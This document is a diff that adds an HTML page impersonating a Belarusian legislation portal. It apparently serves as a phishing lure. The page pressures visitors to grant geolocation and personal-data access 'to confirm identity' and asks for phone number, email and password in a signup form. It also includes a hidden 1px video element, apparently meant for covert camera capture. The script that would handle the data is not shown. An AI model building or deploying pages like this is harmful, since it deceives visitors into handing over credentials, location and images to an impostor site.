@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Законодательство Республики Беларусь</title>
+  <meta name="description" content="Законодательство Республики Беларусь - это Конституция, кодексы, законы и другие нормативно-правовые акты.">
+  <link rel="shortcut icon" href="./rb.png" type="image/x-icon">
+</head>
+<body>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+
+      background-color: rgb(211, 211, 211);
+    }
+
+    nav {
+      width: 100%;
+
+      padding-top: 0.5rem;
+      padding-bottom: 0.5rem;
+
+      background-color: white;
+
+      display: flex;
+      flex-direction: row;
+      flex-wrap: nowrap;
+      justify-content: flex-start;
+      align-items: center;
+      align-content: stretch;
+
+      border-bottom: 0.5px solid rgb(184, 183, 183);
+      z-index: 2;
+    }
+
+    img {
+      margin-left: 0.25rem;
+    }
+
+    .text {
+      color: #222;
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: 500;
+      font-size: 1.5rem;
+      padding-left: 1rem;
+      background-color: white;
+    }
+
+    .main {
+      margin: 2rem;
+      height: 100%;
+    }
+
+    .main-text {
+      margin: 1rem auto;
+      text-align: center;
+
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: 1rem;
+    }
+
+    .form-wrapper {
+      background-color: white;
+      z-index: 1;
+    }
+
+    input {
+      display: block;
+      height: 40px;
+      margin: 1.5rem auto;
+      padding-left: 0.5rem;
+      background-color: white;
+      border: 1px solid red;
+    }
+
+    button {
+      color: white;
+      background-color: rgb(63, 63, 126);
+      width: 100%;
+      padding: 1rem 2rem;
+      margin-top: 1rem;
+      border: none;
+      font-size: 1rem;
+      cursor: pointer;
+      position: relative;
+      left: 50%;
+      transform: translate(-50%, 0);
+    }
+
+    video {
+      margin: 0 auto;
+      visibility: hidden;
+      height: 1px;
+    }
+
+  </style>
+  <nav>
+    <img src="./rb.png" alt="" width="80" height="80">
+    <div class="text">Законодательство Республики Беларусь</div>
+  </nav>
+  <video src=""  id="video" width="320"></video>
+  <div class="main">
+    <p class="main-text">
+      Для продолжения просмотра, пожалуйста, разрешите вашему браузеру использовать геолокационные и персональные данные для обработки и потдверждения вашей личности.
+    </p>
+
+    <p class="main-text">
+      В противном случае доступ к контенту будет ограничен в целях безопасности.
+    </p>
+
+    <div class="form-wrapper">
+      <form action="">
+        <input type="number" name="number" id="number" placeholder="Номер телефона" required>
+        <input type="email" name="email" id="email" placeholder="Email" required>
+        <input type="password" name="password" id="password" placeholder="Пароль" required>
+        <button id="btn">Зарегистрироваться</button>
+      </form>
+    </div>
+  </div>
+  <script src="./main.js" type="module"></script>
+</body>
+</html>
